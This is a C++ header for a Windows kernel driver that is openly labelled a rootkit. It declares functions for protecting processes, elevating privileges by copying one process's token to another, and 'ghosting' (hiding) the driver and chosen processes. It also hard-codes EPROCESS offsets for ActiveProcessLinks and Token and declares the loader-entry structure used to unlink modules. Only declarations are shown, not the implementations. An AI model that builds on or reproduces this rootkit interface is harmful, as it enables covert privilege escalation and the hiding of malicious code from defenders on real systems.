#pragma once
#include <ntifs.h>
#include <ntddk.h>
#include <windef.h>
#include "Debug.hpp"

#define ACTIVE_PROCESS_LINKS 0x448
#define TOKEN 0x4b8

namespace Rootkit
{
	NTSTATUS ProtectProcess(DWORD PID);
	NTSTATUS ProcessElevation(ULONG srcPid, ULONG targetPid);
}

namespace Ghost
{
	VOID GhostDriver(PDRIVER_OBJECT DriverObject);
	PCHAR GhostProcess(UINT32 pid);
}

extern "C"
NTSYSAPI NTSTATUS NTAPI ZwSetInformationProcess(
	__in HANDLE ProcessHandle,
	__in PROCESSINFOCLASS ProcessInformationClass,
	__in_bcount(ProcessInformationLength) PVOID ProcessInformation,
	__in ULONG ProcessInformationLength);

extern "C"
_Must_inspect_result_
NTSYSAPI NTSTATUS NTAPI ZwAdjustPrivilegesToken(
	_In_ HANDLE TokenHandle,
	_In_ BOOLEAN DisableAllPrivileges,
	_In_opt_ PTOKEN_PRIVILEGES NewState,
	_In_ ULONG BufferLength,
	_Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
	_When_(PreviousState != NULL, _Out_) PULONG ReturnLength
);

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;